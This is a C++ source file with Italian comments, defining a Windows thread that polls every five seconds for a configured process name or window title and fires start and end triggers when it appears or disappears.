#include "Event.h"
#include "Common.h"
#include "Conf.h"
#include "ProcessMonitor.h"

// Il formato dei parametri e' il seguente:
// Azione da triggerare a processo TERMINATO (TRIGGER_ACTION(myData->pParams))
// Tipo di ricerca da fare (window title [1] o nome del processo [0])
// Nome del processo in WCHAR NULL-terminato
// Abbiamo un thread per processo, tuttavia il thread e' estremamente lightweight poiche'
// effettua solo un busy-cycle, il resto viene fatto tutto dalla classe singleton Process.
DWORD WINAPI OnProcess(LPVOID lpParam) {
	ProcessMonitor *processObj = ProcessMonitor::self();
	Event *me = (Event *)lpParam;
	Configuration *conf;
	wstring processName;
	BOOL onlyWindow, processActive = FALSE;
	HANDLE eventHandle = me->getEvent();

	me->setStatus(EVENT_RUNNING);
	conf = me->getConf();

	try {
		processName = conf->getString(L"process");
	} catch (...) {
		processName = L"";
	}

	if (processName.empty()) {
		me->setStatus(EVENT_STOPPED);

		return 0;
	}

	try {
		onlyWindow = conf->getBool(L"window");
	} catch (...) {
		onlyWindow = FALSE;
	}

	DBG_TRACE(L"Debug - Process.cpp - Process Event is Alive\n", 1, FALSE);

	if (onlyWindow) {
		LOOP {
			if (me->shouldStop()) {
				DBG_TRACE(L"Debug - Process.cpp - Process Event is Closing\n", 1, FALSE);
				me->setStatus(EVENT_STOPPED);

				return 0;
			}

			if (processActive == TRUE && processObj->IsWindowPresent(processName.c_str()) == FALSE) {
				processActive = FALSE;
				me->triggerEnd();
			} else if (processActive == FALSE && processObj->IsWindowPresent(processName.c_str()) == TRUE) {
				processActive = TRUE;
				me->triggerStart();
			}

			WaitForSingleObject(eventHandle, 5000);
		}
	} else {
		LOOP {
			if (me->shouldStop()) {
				DBG_TRACE(L"Debug - Process.cpp - Process Event is Closing\n", 1, FALSE);
				me->setStatus(EVENT_STOPPED);

				return 0;
			}

			if (processActive == TRUE && processObj->IsProcessRunningW(processName.c_str()) == FALSE) {
				processActive = FALSE;
				me->triggerEnd();
			} else if (processActive == FALSE && processObj->IsProcessRunningW(processName.c_str()) == TRUE) {
				processActive = TRUE;
				me->triggerStart();
			}

			WaitForSingleObject(eventHandle, 5000);
		}
	}

	return 0;
}
